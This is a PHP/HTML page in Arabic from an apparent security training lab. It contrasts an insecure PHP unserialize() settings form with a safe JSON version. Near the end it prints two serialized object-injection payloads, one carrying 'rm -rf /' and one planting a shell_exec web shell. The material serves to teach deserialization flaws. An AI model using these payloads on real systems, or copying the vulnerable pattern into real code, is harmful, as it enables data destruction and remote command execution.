
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>إعدادات المستخدم</title>
    <link rel="stylesheet" href="../assets/style.css">
</head>
<body>
    <div class="container">
        <div class="hero">
            <h1>⚙️ إعدادات المستخدم</h1>
            <p>اختبر ثغرة Insecure Deserialization</p>
        </div>
        
        <?php if (isset($_GET['status'])): ?>
            <?php if ($_GET['status'] == 'unsecure_saved'): ?>
                <div class="alert alert-danger">
                    ⚠️ تم حفظ الإعدادات باستخدام طريقة غير آمنة (unserialize)
                </div>
            <?php elseif ($_GET['status'] == 'secure_saved'): ?>
                <div class="alert alert-success">
                    ✅ تم حفظ الإعدادات باستخدام طريقة آمنة (JSON)
                </div>
            <?php endif; ?>
        <?php endif; ?>
        
        <div class="dual-form">
            <div class="form-panel danger">
                <h3>❌ الطريقة غير الآمنة</h3>
                <p class="alert alert-danger">استخدام PHP unserialize() - عرضة لـ Object Injection</p>
                
                <form method="POST" action="save_settings.php" class="form-group">
                    <div class="form-group">
                        <label for="theme_unsecure">السمة:</label>
                        <select id="theme_unsecure" name="theme" required>
                            <option value="light">فاتح</option>
                            <option value="dark">داكن</option>
                            <option value="blue">أزرق</option>
                            <option value="green">أخضر</option>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label for="language_unsecure">اللغة:</label>
                        <select id="language_unsecure" name="language" required>
                            <option value="ar">العربية</option>
                            <option value="en">الإنجليزية</option>
                            <option value="fr">الفرنسية</option>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label for="notifications_unsecure">التنبيهات:</label>
                        <select id="notifications_unsecure" name="notifications" required>
                            <option value="1">مفعلة</option>
                            <option value="0">معطلة</option>
                        </select>
                    </div>
                    
                    <button type="submit" class="btn btn-danger">💾 حفظ (غير آمن)</button>
                </form>
                
                <div class="code-block">
<pre>// الكود الخلفي:
require_once "UserSettings.php";

$settings = new UserSettings();
$settings->theme = $_POST['theme'];
// ... set other properties

$serialized = serialize($settings);
// يحول الكائن إلى: O:12:"UserSettings":3:{...}

file_put_contents('config.txt', $serialized);

// عند القراءة:
$data = file_get_contents('config.txt');
unserialize($data); // ❌ يسمح بتنفيذ __destruct()</pre>
                </div>
            </div>
            
            <div class="form-panel success">
                <h3>✅ الطريقة الآمنة</h3>
                <p class="alert alert-success">استخدام JSON - آمن من هجمات Deserialization</p>
                
                <form method="POST" action="save_settings_secure.php" class="form-group">
                    <div class="form-group">
                        <label for="theme_secure">السمة:</label>
                        <select id="theme_secure" name="theme" required>
                            <option value="light">فاتح</option>
                            <option value="dark">داكن</option>
                            <option value="blue">أزرق</option>
                            <option value="green">أخضر</option>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label for="language_secure">اللغة:</label>
                        <select id="language_secure" name="language" required>
                            <option value="ar">العربية</option>
                            <option value="en">الإنجليزية</option>
                            <option value="fr">الفرنسية</option>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label for="notifications_secure">التنبيهات:</label>
                        <select id="notifications_secure" name="notifications" required>
                            <option value="1">مفعلة</option>
                            <option value="0">معطلة</option>
                        </select>
                    </div>
                    
                    <button type="submit" class="btn btn-success">💾 حفظ (آمن)</button>
                </form>
                
                <div class="code-block">
<pre>// الكود الخلفي:
$settings = [
    'theme' => $_POST['theme'],
    'language' => $_POST['language'],
    'notifications' => $_POST['notifications']
];

$json = json_encode($settings);
// يحول المصفوفة إلى: {"theme":"light","language":"ar"...}

file_put_contents('config.txt', $json);

// عند القراءة:
$data = file_get_contents('config.txt');
$settings = json_decode($data, true); // ✅ يعيد مصفوفة فقط
// لا يوجد تنفيذ لأي كود</pre>
                </div>
            </div>
        </div>
        
        <div class="section">
            <h3>🎯 اختبار الهجوم:</h3>
            <ol>
                <li>استخدم النموذج <strong>غير الآمن</strong> لحفظ الإعدادات</li>
                <li>اذهب إلى <strong>عرض الإعدادات</strong></li>
                <li>افتح ملف <code>data/hacked.txt</code> - ستجد سجلات الهجوم!</li>
                <li>لاحظ أن دالة <code>__destruct()</code> تنفذ تلقائياً</li>
            </ol>
            
            <p><strong>هجوم متقدم (للعرض فقط):</strong></p>
            <div class="code-block">
<pre>// يمكن للمهاجم حقن هذا الكود:
O:12:"UserSettings":3:{s:5:"theme";s:100:"&lt;?php system('rm -rf /'); ?&gt;";s:8:"language";s:2:"en";s:13:"notifications";b:1;}

// أو إنشاء backdoor:
O:12:"UserSettings":3:{s:5:"theme";s:200:"&lt;?php if(isset($_GET['cmd'])){echo shell_exec($_GET['cmd']);} ?&gt;";s:8:"language";s:2:"en";s:13:"notifications";b:1;}</pre>
            </div>
        </div>
        
        <div class="nav-links">
            <a href="view_settings.php" class="btn">📋 عرض الإعدادات الحالية</a>
            <a href="../index.php" class="btn">🏠 الصفحة الرئيسية</a>
        </div>
    </div>
</body>
</html>
